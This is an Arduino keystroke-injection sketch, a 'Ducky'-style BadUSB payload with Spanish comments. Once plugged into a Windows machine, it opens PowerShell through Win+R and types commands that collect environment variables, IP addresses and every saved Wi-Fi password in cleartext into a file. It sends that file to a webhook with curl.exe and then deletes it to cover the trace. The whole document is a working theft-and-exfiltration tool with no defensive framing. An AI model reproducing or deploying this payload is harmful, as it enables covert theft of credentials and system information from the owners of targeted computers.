#include "HID.h"
#include <Keyboard.h>

// Function to execute PowerShell commands
void executePowerShell() {
  // Escribe 'powershell' y presiona Enter
  Keyboard.print("powershell");
  typeKey(KEY_RETURN);
  delay(1000); // Espera a que PowerShell se abra

  // Ejecuta el comando en PowerShell
  Keyboard.print("$url=''; "); //url del webhook
  Keyboard.print("dir env: >> stats.txt; ");
  Keyboard.print("Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> stats.txt; ");
  Keyboard.print("(netsh wlan show profiles) | Select-String \":(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt; ");
  Keyboard.print("$Body=@{ content = \"**$env:computername Stats from Ducky**\"}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json); ");
  Keyboard.print("curl.exe -F \"file1=@stats.txt\" $url; ");
  Keyboard.print("Remove-Item '.\\stats.txt'; ");
  Keyboard.print("exit");
  //typeKey(KEY_RETURN); // Ejecuta el comando
}

// Utility function to type a key with a delay
void typeKey(int key){
  Keyboard.press(key);
  delay(500); // Espera para asegurar que la tecla se registre
  Keyboard.release(key);
}

// Init function
void setup() {
  // Start Keyboard
  Keyboard.begin();

  // Start Payload
  // press Windows+R
  delay(400); // Espera para asegurar que el sistema esté listo
  Keyboard.press(KEY_LEFT_GUI); // Presiona la tecla Windows
  delay(700); // Mantiene presionada la tecla Windows
  Keyboard.press('r'); // Presiona 'r' para abrir el cuadro de diálogo Ejecutar
  Keyboard.releaseAll(); // Libera todas las teclas
  delay(400); // Espera un momento

  // Llamada a la función que ejecuta los comandos de PowerShell
  executePowerShell();

  Keyboard.end();
}

// Unused loop function
void loop() {}
